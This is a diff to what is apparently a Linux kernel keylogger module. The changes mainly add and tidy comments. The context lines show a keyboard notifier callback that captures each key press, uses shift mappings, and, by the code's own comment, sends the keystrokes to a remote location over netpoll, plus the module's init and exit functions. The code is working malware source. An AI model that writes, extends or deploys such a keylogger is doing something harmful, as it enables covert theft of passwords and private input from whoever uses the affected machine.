@@ -43,18 +43,16 @@ static struct netpoll np;
 /	keyboard_notifier_callback
 /	must be of the type notifier_fn_t(notifier_block *nb,
 /									  unsigned long action, void *data)
-/   This is where the key data is send to a remote locations
+/   This is where the key data is send to a remote location
 */
 int keyboard_notifier_callback(struct notifier_block *nb, unsigned long action, void *data){
 	struct keyboard_notifier_param *kb = data;
 
-	/*
-		http://lxr.free-electrons.com/source/include/linux/notifier.h#L206
-		for action == KBD_KEYCODE
-	*/
+	// Filter so we only send actual keycodes on key presses
 	if(action == KBD_KEYCODE && kb->down == KEY_PRESSED) {
 		char message[16];
 		
+		//If shift is held, use the shift key mappings
 		if(kb->shift == KEY_PRESSED)
 			strcpy(message, keysShift[kb->value]);
 		else
@@ -67,6 +65,12 @@ int keyboard_notifier_callback(struct notifier_block *nb, unsigned long action, 
 	return 0;
 } 
 
+/*
+/	init_keylogger
+/	This is the module_init function
+/	Sets up the notifier block with our callback for keyboard presses
+/	Also sets up the netpoll object for use in the callback
+*/
 static int __init init_keylogger(void){
 	nb.notifier_call = keyboard_notifier_callback;
 
@@ -85,6 +89,10 @@ static int __init init_keylogger(void){
 	return 0;
 }
 
+/*
+/	exit_keylogger
+/	The module_exit function, should be straightforward enough
+*/
 static void __exit exit_keylogger(void){
 	unregister_keyboard_notifier(&nb);
 }
